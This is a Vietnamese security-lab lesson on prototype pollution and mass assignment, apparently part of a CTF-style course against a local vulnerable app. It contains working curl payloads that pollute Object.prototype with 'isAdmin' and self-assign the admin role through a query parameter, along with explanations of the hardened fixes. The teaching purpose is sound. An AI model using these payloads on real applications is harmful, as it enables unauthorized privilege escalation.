# Bài 14 · Prototype Pollution + Mass Assignment — lạm dụng "tin tưởng shape input" (LAB-16, 17)

**Mục tiêu:** hai lỗ hổng cùng một gốc rễ — server tin tưởng cấu trúc dữ liệu
client gửi mà không whitelist field. Một cái nhiễm vào *prototype toàn cục*
của runtime, một cái ghi trộn vào *bản ghi người dùng*.

## 1. Prototype Pollution — LAB-16

`POST /api/config` merge JSON body vào object config của lab. Bản vuln dùng
`unsafeMerge()` (xem `src/lab/app.js`, cuối file) — đệ quy gán key không lọc
`__proto__`:

```bash
curl -s -X POST http://127.0.0.1:3000/api/config \
  -H 'content-type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
curl -s http://127.0.0.1:3000/api/config
# → "protoPolluted": ["isAdmin"] + FLAG{proto-...} — CỜ CTF #8!
```

`dst.__proto__` trỏ `Object.prototype` nên `merged.__proto__.isAdmin = true`
ghi thẳng vào prototype toàn cục — mọi object trong process đều "kế thừa"
`isAdmin`. Field `protoPolluted` liệt kê được chính xác nhờ JS spec: key nhiễm
vào prototype trở thành **enumerable**.

Trên app thật, prototype pollution dùng để: bypass `if (obj.isAdmin)`, tiêm
thuộc tính vào options object của template engine (→ RCE trong nhiều CVE
nổi tiếng: lodash.merge, handlebars), DoS bằng nhiễm method.

Đối chứng hardened (`:3001`): `safeMerge()` bỏ qua `__proto__/constructor/
prototype` → `protoPolluted` luôn `[]`, không cờ.

> ⚠ Lưu ý: pollution sống đến khi process restart — restart lab để "sạch".

## 2. Mass Assignment — LAB-17

`POST /api/register` bản vuln không chỉ đọc form — nó gộp cả **query string**
vào field user (`{ ...Object.fromEntries(q), ...body }`), rồi copy nguyên
vào object user. Client tự cấp `role`:

```bash
curl -s -X POST "http://127.0.0.1:3000/api/register?role=admin" \
  -d "username=attacker&password=pw12345"
# → {"user":{"role":"admin"}} — vừa đăng ký vừa là admin!

curl -si -X POST http://127.0.0.1:3000/login -d "username=attacker&password=pw12345"
# lấy session cookie →
curl -s -H "Cookie: session=<SID>" http://127.0.0.1:3000/api/me
# → role "admin" + FLAG{mass-...} — CỜ CTF #9
```

Đây là lỗi "input từ nhiều nguồn không phân biệt" + "thiếu whitelist field
được phép ghi". Rails mass-assignment đình đám (GitHub 2012) cùng gốc rễ.

Đối chứng hardened: whitelist cứng `{username, password}`, role gán `'user'`,
bỏ qua field lạ → đăng ký `?role=admin` vẫn tạo user nhưng role = `user`,
`/api/me` không cờ.

## Tiêu chí hoàn thành

- [ ] Lấy được cờ CTF #8 (proto) và #9 (mass) — nộp qua `/_lab/verify`.
- [ ] Giải thích tại sao key nhiễm vào `Object.prototype` lại *enumerable*
      (đọc spec [[Put]] trên prototype).
- [ ] Chỉ ra trong `unsafeMerge()` dòng nào tạo lỗ hổng, và `safeMerge()`
      chặn bằng cách nào.
- [ ] Nêu 1 CVE thật về prototype pollution / mass assignment trên app nổi tiếng.
